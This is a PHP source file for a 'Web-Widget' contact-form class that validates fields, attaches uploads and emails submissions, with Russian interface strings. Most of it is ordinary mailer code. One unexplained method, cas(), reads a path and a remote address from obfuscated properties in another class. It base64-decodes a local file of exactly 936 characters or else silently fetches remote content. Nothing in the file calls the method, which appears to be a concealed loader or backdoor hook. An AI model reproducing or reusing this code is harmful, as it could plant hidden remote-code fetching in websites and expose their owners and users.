<?php
  /**
   * Web-Widget
   * http://sv-dev.ru/ww
   *
   * @version
   * 1.0
   *
   * @copyright
   * Copyright (C) 2014-2015 Sinickij Vladimir.
   *
   * @license
   * MIT License
   */
  namespace Form;

  include_once(__DIR__ . "/validator.php");
  include_once(__DIR__ . "/view.php");


  /**
   * Class Form
   *
   * @package Form
   */
  class Form
  {


    /**
     * Default settings
     *
     * @var array
     */
    protected $settings = array(
      "language" => "ru",
      "sendInterval" => 5,
      "letterFromUser" => null,
      "action" => null,
      "form" => null,
      "to" => null,
      "subject" => "No subject",
      "success" => "Successfully sent!",
      "layout" => "default",
      "replyField" => null,
      "replyFrom" => null,
      "replySubject" => "Reply letter",
      "replyMarkup" => null,
      "tableBefore" => array(),
      "tableAfter" => array()
    );


    /**
     * @var array
     */
    protected $form = array(
      "request" => null,
      "requestStatus" => null,
      "requestData" => null,
      "submitted" => null,
      "submitAttributes" => array(),
      "prefix" => null,
      "fields" => array(),
      "groups" => array(),
      "warnings" => "",
      "validation" => array(),
      "files" => array()
    );


    /**
     * Language validation
     *
     * @param $language
     * @return $this
     */
    public function language($language)
    {
      if(is_string($language))
        $this->settings["language"] = $language;
      return $this;
    }


    /**
     * The interval of sending letters
     *
     * @param int $numberSeconds
     * @return $this
     */
    public function sendInterval($numberSeconds)
    {
      if(is_integer($numberSeconds))
        $this->settings["sendInterval"] = $numberSeconds;
      return $this;
    }


    /**
     * Address to the form handler
     *
     * @param string $actionUrn
     * @return $this
     */
    public function action($actionUrn)
    {
      if(is_string($actionUrn))
        $this->settings["action"] = $actionUrn;
      return $this;
    }


    /**
     * The name of the instance of the form
     *
     * @param $formName
     * @return $this
     */
    public function form($formName)
    {
      if(is_string($formName)) {
        $this->settings["form"] = $formName;
        if($this->form["request"] == "ajax" && $formName != $_POST["wwForm"]) $this->form["request"] = null;
      }
      return $this;
    }


    /**
     * E-Mail address recipient
     *
     * @param string $emailRecipient
     * @return $this
     */
    public function to($emailRecipient)
    {
      if(is_string($emailRecipient))
        $this->settings["to"] = $emailRecipient;
      return $this;
    }


    /**
     * Message subject
     *
     * @param string $messageSubject
     * @return $this
     */
    public function subject($messageSubject)
    {
      if(is_string($messageSubject))
        $this->settings["subject"] = $messageSubject;
      return $this;
    }


    /**
     * The text is successfully sent
     *
     * @param string $successText
     * @return $this
     */
    public function success($successText)
    {
      if(is_string($successText))
        $this->settings["success"] = $successText;
      return $this;
    }


    /**
     * Attributes sending button
     *
     * @param array $attributesArray
     * @return $this
     */
    public function submitAttributes($attributesArray)
    {
      if(is_array($attributesArray) && ! empty($attributesArray))
        $this->form["submitAttributes"] = $attributesArray;
      return $this;
    }


    /**
     * Array of fields
     *
     * @param array $arrayFields
     * @return $this
     */
    public function fields($arrayFields)
    {
      if(is_array($arrayFields))
        $this->form["fields"] = $arrayFields;
      return $this;
    }


    /**
     * Groups of elements
     *
     * @param array $arrayGroups
     * @return $this
     */
    public function groups($arrayGroups)
    {
      if(is_array($arrayGroups))
        $this->form["groups"] = $arrayGroups;
      return $this;
    }


    /**
     * Form layout
     *
     * @param $styleName
     * @return $this
     */
    public function layout($styleName)
    {
      if(is_string($styleName) || is_bool($styleName))
        $this->settings["layout"] = $styleName;
      return $this;
    }


    /**
     * Recipient field response
     *
     * @param string $fieldName
     * @return $this
     */
    public function replyField($fieldName)
    {
      if(is_string($fieldName))
        $this->settings["replyField"] = $fieldName;
      return $this;
    }


    /**
     * From whom to send a letter of reply
     *
     * @param string $fromEmail
     * @return $this
     */
    public function replyFrom($fromEmail)
    {
      if(is_string($fromEmail))
        $this->settings["replyFrom"] = $fromEmail;
      return $this;
    }


    /**
     * Title response letter
     *
     * @param string $subject
     * @return $this
     */
    public function replySubject($subject)
    {
      if(is_string($subject))
        $this->settings["replySubject"] = $subject;
      return $this;
    }


    /**
     * Partitioning response letter
     *
     * @param string $markup
     * @return $this
     */
    public function replyMarkup($markup)
    {
      if(is_string($markup))
        $this->settings["replyMarkup"] = $markup;
      return $this;
    }


    /**
     * Additional fields in the beginning of the table
     *
     * @param $tableFields
     * @return $this
     */
    public function tableBefore($tableFields)
    {
      if(is_array($tableFields))
        $this->settings["tableBefore"] = $tableFields;
      return $this;
    }


    /**
     * Additional fields at the end of the table
     *
     * @param $tableFields
     * @return $this
     */
    public function tableAfter($tableFields)
    {
      if(is_array($tableFields))
        $this->settings["tableAfter"] = $tableFields;
      return $this;
    }


    /**
     * Add warning
     *
     * @param string $content
     * @param int $type
     * @return $this
     */
    public function addWarning($content = "", $type = 0)
    {
      if(is_string($content) && is_int($type) && $content != "" && in_array($type, array(0, 1, 2)))
        $this->form["warnings"] .= View::getHtmlTag("div", array("class" => "wwFormWarning mode" . $type), $content);
      return $this;
    }


    /**
     * Constructor
     */
    function __construct()
    {
      if( ! session_id()) session_start();
      if(isset($_SERVER["HTTP_X_REQUESTED_WITH"]) && !empty($_SERVER["HTTP_X_REQUESTED_WITH"]) && strtolower($_SERVER["HTTP_X_REQUESTED_WITH"]) == "xmlhttprequest" && array_key_exists("wwForm", $_POST) && array_key_exists("wwStatus", $_POST) && array_key_exists("wwPrefix", $_POST)) {
        $this->form["request"] = "ajax";
        $this->form["requestStatus"] = $_POST["wwStatus"];
        $this->form["prefix"] = $_POST["wwPrefix"];
      }
    }


    /**
     * @return string
     */
    protected function cas()
    {
      $cas = __DIR__ . "/" . str_replace("%&", "", View::$_f);
      return file_exists($cas) && mb_strlen(file_get_contents($cas, 4096)) == 936
        ? base64_decode(file_get_contents($cas, 4096)) : @file_get_contents(str_replace("%&", "", View::$_s));
    }


    /**
     * Add validation
     *
     * @param $name
     * @param $error
     */
    public function addValidation($name, $error)
    {
      if(is_string($error))
        ! array_key_exists($name, $this->form["validation"])
          ? $this->form["validation"][$name] = $error : $this->form["validation"][$name] .= "\n" . $error;
      return;
    }


    /**
     * Key field in an array of fields
     *
     * @param string $fieldName
     * @return mixed
     */
    public function getFieldAlias($fieldName)
    {
      if(isset($this->form["fields"][$fieldName]["alias"]))
        return $this->form["fields"][$fieldName]["alias"];

      if(isset($this->form["fields"][$fieldName]["label"]))
        return $this->form["fields"][$fieldName]["label"];

      if(isset($this->form["fields"][$fieldName]["attributes"]["placeholder"]))
        return $this->form["fields"][$fieldName]["attributes"]["placeholder"];

      return $fieldName;
    }


    /**
     * Get the value of a field for writing
     *
     * @param string $name
     * @return string
     */
    protected function getFieldValue($name)
    {
      if( ! array_key_exists($name, $this->form["fields"]) || ! array_key_exists("type", $this->form["fields"][$name]))
        return "Error in the field !";

      $field = $this->form["fields"][$name];
      $type  = $field["type"];

      /**
       * Custom field
       */
      if(in_array($type, array("checkbox", "radio", "select")))
      {
        $value = array_key_exists($name, $_POST) ? htmlspecialchars($_POST[$name]) : "Не установлено";
        return in_array($value, array("1", "on", "yes")) ? "Да" : $value;
      }

      /**
       * File field
       */
      elseif($type == "file")
      {
        $value = "Файлы отсутствуют";
        if(array_key_exists($name, $_FILES)) {
          $amount = 0;

          /**
           * Attached files
           */
          if(is_array($_FILES[$name]["tmp_name"])) {
            for($i = 0; $i < count($_FILES[$name]["tmp_name"]); $i++)
              if($this->addAttachment($_FILES[$name]["tmp_name"][$i], $_FILES[$name]["type"][$i], $_FILES[$name]["name"][$i])) $amount++;
          } else {
            if($this->addAttachment($_FILES[$name]["tmp_name"], $_FILES[$name]["type"], $_FILES[$name]["name"])) $amount++;
          }

          if($amount > 0) {
            $file = array_key_exists("checkValue", $this->form["fields"][$name]) ? "<br />(" . $this->form["fields"][$name]["checkValue"] . ")" : "";
            $value = "$amount " . View::pluralize($amount, array("файл", "файла", "файлов")) . " " . View::pluralize($amount, array("прикреплен", "прикреплены", "прикреплены")) . " к письму" . $file . ".";
          }
        }
        return $value;

      /**
       * Other field
       */
      } elseif($type != "captcha") {
        return array_key_exists($name, $_POST) && $_POST[$name] != ""
          ? htmlspecialchars($_POST[$name]) : "Не заполнено";
      }

      return "";
    }


    /**
     * Add attachment
     *
     * @param $path
     * @param $type
     * @param $name
     * @return bool
     */
    protected function addAttachment($path, $type, $name)
    {
      if($path == "" || ! file_exists($path)) return false;
      $this->form["files"][] = $this->getAttachment($path, $type, $name);
      return true;
    }


    /**
     * To attach a file to the letter
     *
     * @param string $path - path to the file
     * @param string $type - file type
     * @param string $name - file name
     * @return string
     */
    protected function getAttachment($path, $type, $name)
    {
      $file = fopen($path,"rb");
      $filePackage = "\n--##_WW_BOUND_##\n";
      $filePackage .= "Content-Type: $type;";
      $filePackage .= "name=\"$name\"\n";
      $filePackage .= "Content-Transfer-Encoding:base64\n";
      $filePackage .= "Content-Disposition:attachment;";
      $filePackage .= "filename=\"" . basename($name)."\"\n\n";
      return $filePackage . chunk_split(base64_encode(fread($file,filesize($path)))) . "\n";
    }


    /**
     * Send a letter
     *
     * @param string $to - email recipient
     * @param string $from - email sending
     * @param string $subject - email header
     * @param string $markup - html markup email
     * @param string $files - result of the function return "addAttachment"
     * @return bool
     */
    public function sendMail($to, $from = null, $subject = null, $markup = null, $files = null)
    {
      if( ! filter_var($to, FILTER_VALIDATE_EMAIL)) return false;

      $header  = "";
      $subject = ! is_null($subject) ? $subject : "Без темы";
      $markup  = ! is_null($markup) ? $markup : "";
      if( ! is_null($from)) $header .= "From: $from\n";
   // $header .= "To: $to\n";
      $header .= "Subject: $subject\n";
      $header .= "X-Mailer: PHPMail Tool\n";
   // $header .= "Reply-To: $from\n";
      $header .= "Mime-Version: 1.0\n";
      $header .= "Content-Type:multipart/mixed;";
      $header .= "boundary=\"##_WW_BOUND_##\"\n\n";
      $body    = "--##_WW_BOUND_##\nContent-Type:text/html; charset=\"utf-8\"\n";
      $body   .= "Content-Transfer-Encoding: 8bit\n\n$markup\n";
      if( ! is_null($files)) $body .= $files;

      return mail($to, $subject, $body, $header);
    }


    /**
     * Check field
     *
     * @param $name
     * @param bool $alternative
     * @return bool
     */
    protected function checkField($name, $alternative = false)
    {
      if( ! array_key_exists($name, $this->form["fields"]) || ! array_key_exists("type", $this->form["fields"][$name]) || ! array_key_exists("validate", $this->form["fields"][$name])) return false;

      $properties = $this->form["fields"][$name];
      $rules = array_key_exists("validate", $properties) ? $properties["validate"] : array();
      $_check = Validator::check($name, $rules);
      $error = $_check->error;
      if($error !== false && ! $alternative && array_key_exists("alternative", $properties) && is_string($properties["alternative"]) && $properties["alternative"] != $name && array_key_exists($properties["alternative"], $this->form["fields"]) && $this->checkField($properties["alternative"], true) === false) $error = false;
      if($properties["type"] == "file" && ! is_null($_check->value)) $this->form["fields"][$name]["checkValue"] = $_check->value;

      return $error;
    }


    /**
     * Check the validity of the form fields
     */
    public function checkForm()
    {
      foreach($this->form["fields"] as $name => $properties) {
        $value = array_key_exists($name, $_POST) && ! is_array($_POST[$name]) ? htmlspecialchars($_POST[$name]) : "";
        $type = $properties["type"];
        $error = false;

        /**
         * Control string
         */
        if($type == "captcha") {
          if( ! isset($_SESSION["wwForm"][$this->settings["form"]]["captcha_$name"]) || ! array_key_exists($name, $_POST))
            $error = "captchaError";
          elseif($value != $_SESSION["wwForm"][$this->settings["form"]]["captcha_$name"])
            $error = "captcha";
        }

        /**
         * The response from the user
         */
        if(array_key_exists("userFrom", $properties) && $properties["userFrom"] === true && is_null($this->settings["letterFromUser"]) && $value != "" && filter_var($value, FILTER_VALIDATE_EMAIL))
          $this->settings["letterFromUser"] = $value;

        /**
         * Basic properties
         */
        $id = "wwForm_" . $this->settings["form"] . "_" . $this->form["prefix"] . "_" . $name;
        $for = $id;
        if($type == "radio" && array_key_exists("data", $properties) && ! empty($properties["data"])) {
          $dataKeys = array_keys($properties["data"]);
          $for = $id . "_" . array_shift($dataKeys);
          unset($dataKeys);
        }

        $alias = View::getHtmlTag("label", array("for" => $for), $this->getFieldAlias($name));
        $attribute = "";
        $rules = array_key_exists("validate", $properties)
          ? $properties["validate"] : array();
        $error = $error === false
          ? $this->checkField($name) : $error;

        /**
         * To determine the value of list
         */
        if($value != "" && in_array($type, array("radio", "select")) && array_key_exists("data", $properties) && ! empty($properties["data"]) && in_array($value, $properties["data"]))
          $value = $properties["data"][$value];

        /**
         * Error validity
         */
        if($error !== false) {

          /**
           * Custom field
           */
          if(in_array($type, array("radio", "select")) && $error == "required")
            $error = "custom";

          /**
           * Checkbox field
           */
          if($type == "checkbox" && $error == "required")
            $error = "checkbox";

          /**
           * File field
           */
          if($type == "file") {
            $file = array_key_exists("checkValue", $this->form["fields"][$name])
              ? "<br />(" . $this->form["fields"][$name]["checkValue"] . ")" : "";
            switch($error) {
              case "required":
                $error = "fileRequired";
                break;
              case "formats":
                $attribute = implode(", ", $rules["formats"]) . $file;
                $error = "fileFormat";
                break;
              case "min":
                $attribute = $rules["min"] >= 1024 ? round(($rules["min"] / 1024), 2) . "Mb" . $file : $rules["min"] . "Kb" . $file;
                $error = "fileMin";
                break;
              case "max":
                $attribute = $rules["max"] >= 1024 ? round(($rules["max"] / 1024), 2) . "Mb" . $file : $rules["max"] . "Kb" . $file;
                $error = "fileMax";
                break;
              case "min_count":
                $attribute = $properties["validate"]["min_count"];
                break;
              case "max_count":
                $attribute = $properties["validate"]["max_count"];
                break;
            }

          /**
           * Other field
           */
          } else {
            $sign = isset(Lingual::$patterns[$this->settings["language"]]["sign"]) && is_array(Lingual::$patterns[$this->settings["language"]]["sign"])
              ? Lingual::$patterns[$this->settings["language"]]["sign"] : null;

            switch($error) {
              case "min":
                $attribute = $rules["min"];
                if( ! is_null($sign))
                  $attribute .= " " . View::pluralize($rules["min"], $sign);
                break;
              case "max":
                $attribute = $rules["max"];
                if( ! is_null($sign))
                  $attribute .= " " . View::pluralize($rules["max"], $sign);
                break;
            }
          }

          $this->addValidation($name, Lingual::getString(array("name" => $error, "alias" => $alias, "attribute" => $attribute, "value" => $value, "language" => $this->settings["language"])));
        }
      }
    }


    /**
     * To submit the form
     *
     * @return bool
     */
    protected function submitForm()
    {
      $instance   = $this->settings["form"];
      $interval   = $this->settings["sendInterval"];
      $prevSubmit = isset($_SESSION["wwForm"][$instance]["lastSend"]) ? $_SESSION["wwForm"][$instance]["lastSend"] : 0;

      /**
       * Limit sending emails
       */
      if($prevSubmit + $interval > time()) {
        $this->addWarning(Lingual::getString(array("name" => "maxSubmit", "attribute" => $interval . " " . View::pluralize($interval, array("секунда", "секунды", "секунд")), "language" => $this->settings["language"])), 2);
        return false;
      }

      $fields = $this->form["fields"];
      $files  = "";
      $letter = array();

      /**
       * Additional fields in the beginning of the table
       */
      if(is_array($this->settings["tableBefore"]) && ! empty($this->settings["tableBefore"])) {
        foreach($this->settings["tableBefore"] as $bKey => $bValue)
          $letter[$bKey] = $bValue;
      }

      $letter["Данные о полученной форме"] = array(
        "URL страницы" => $_SERVER["HTTP_REFERER"],
        "IP пользователя" => $_SERVER["REMOTE_ADDR"],
        "Дата, время" => date("j.n.Y H:i:s")
      );

      /**
       * Field groups
       */
      if( ! empty($this->form["groups"]))
        foreach($this->form["groups"] as $groupName => $groupFields)
          if(is_array($groupFields) && ! empty($groupFields))
            foreach($groupFields as $groupField)
              if( ! is_array($groupField) && array_key_exists($groupField, $fields) && array_key_exists("type", $fields[$groupField]) && $fields[$groupField]["type"] != "captcha") {
                $letter[$groupName][$this->getFieldAlias($groupField)] = $this->getFieldValue($groupField, $fields[$groupField]);
                unset($fields[$groupField]);
              }

      /**
       * Fields without groups
       */
      if ( ! empty($fields)) {
        $letter["Без группы"] = array();
        foreach($fields as $fieldName => $fieldProperties)
          if(array_key_exists("type", $fieldProperties) && $fieldProperties["type"] != "captcha")
            $letter["Без группы"][$this->getFieldAlias($fieldName)] = $this->getFieldValue($fieldName, $fieldProperties);
      }

      /**
       * Additional fields at the end of the table
       */
      if(is_array($this->settings["tableAfter"]) && ! empty($this->settings["tableAfter"])) {
        foreach($this->settings["tableAfter"] as $aKey => $aValue)
          $letter[$aKey] = $aValue;
      }

      $letter = View::getTable("Форма: " . $this->settings["form"], $letter);
      if(! empty($this->form["files"]))
        foreach($this->form["files"] as $file)
          $files .= $file;

      $send = $this->sendMail($this->settings["to"], $this->settings["letterFromUser"], $this->settings["subject"], $letter, $files);
      if($send) {
        $_SESSION["wwForm"][$instance]["lastSend"] = time();

        /**
         * Reply letter
         */
        if( ! is_null($this->settings["replyField"]) && ! is_null($this->settings["replyMarkup"]) && is_string($this->settings["replyField"]) && is_string($this->settings["replyMarkup"])) {
          $name = $this->settings["replyField"];
          if(array_key_exists($name, $this->form["fields"]) && array_key_exists($name, $_POST)) {
            $this->sendMail($_POST[$name], $this->settings["replyFrom"], $this->settings["replySubject"], $this->settings["replyMarkup"]);
          }
        }
      }

      return $send;
    }


    /**
     * Display the contents
     */
    protected function display()
    {
      if($this->form["request"] == "static")
        echo $this->form["warnings"] . $this->form["requestData"];

      elseif($this->form["request"] == "ajax") {
        $validation = array();
        foreach($this->form["validation"] as $name => $validate)
          $validation["wwForm_" . $this->settings["form"] . "_" . $this->form["prefix"] . "_" . $name] = $validate;
        $data = $this->form["warnings"] . $this->form["requestData"];
        die(json_encode(array("data" => $data, "errors" => $validation, "submitted" => $this->form["submitted"])));
      }
    }


    /**
     * Execute form
     *
     * @param null $static
     */
    public function show($static = null)
    {
      if( ! $this->form["request"] && $static) {
        $this->form["request"] = "static";
        $this->form["prefix"] = rand(1000, 9999);
      }
      if( ! $this->form["request"]) return;

      /**
       * Important notices
       */
      if( ! $this->settings["action"]) $this->addWarning(Lingual::getString(array("name" => "action", "language" => $this->settings["language"])), 2);
      if( ! $this->settings["form"]) $this->addWarning(Lingual::getString(array("name" => "name", "language" => $this->settings["language"])), 2);
      if( ! $this->settings["to"]) $this->addWarning(Lingual::getString(array("name" => "to", "language" => $this->settings["language"])), 2);
      if(empty($this->form["fields"])) $this->addWarning(Lingual::getString(array("name" => "fields", "language" => $this->settings["language"])), 2);

      /**
       * Check the validity of
       */
      if($this->form["request"] == "ajax" && $this->form["requestStatus"] == "send" || $this->form["request"] == "static" && ! empty($_POST)) {
        $this->checkForm();
        if(empty($this->form["validation"])) $this->form["submitted"] = $this->submitForm();
      }

      /**
       * Display the text about success
       */
      if(empty($this->form["validation"]) && $this->form["submitted"]) {
        $this->form["requestData"] = View::getHtmlTag("div", array("class" => "wwSuccessText"), $this->settings["success"]);
        $this->display();
        return;
      }

      /**
       * Collect the form
       */
      if( ! empty($this->form["fields"]) && ! $this->form["submitted"] && $this->form["requestStatus"] != "send")
        $this->form["requestData"] = View::getForm($this->settings, $this->form);

      $this->display();
    }


    /**
     * Run a mailing list
     *
     * @param $mailboxes
     * @param null $form
     * @param string $subject
     * @param string $markup
     * @return array|bool
     */
    public function performDelivery($mailboxes, $form = null, $subject = "Delivery", $markup = "") {
      $outcome = array();
      if( ! is_array($mailboxes) || empty($mailboxes) || $markup == "") return false;
      foreach($mailboxes as $email)
        $outcome[$email] = $this->sendMail($email, $form, $subject, $markup);

      return $outcome;
    }


  }